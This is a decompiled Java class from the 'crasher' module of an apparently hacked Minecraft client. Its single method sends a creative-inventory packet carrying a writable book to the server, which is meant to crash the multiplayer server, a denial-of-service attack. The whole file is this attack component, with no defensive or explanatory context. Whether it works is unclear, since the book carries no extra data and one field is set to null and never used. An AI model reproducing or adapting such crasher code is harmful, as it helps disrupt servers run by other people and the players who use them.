// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.netty;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;

public class NettyCrasher3
{
    public static final ItemStack book;
    private static final ClickType Window;
    
    static {
        book = new ItemStack(Items.WRITABLE_BOOK);
        Window = null;
    }
    
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(1, NettyCrasher3.book));
    }
}
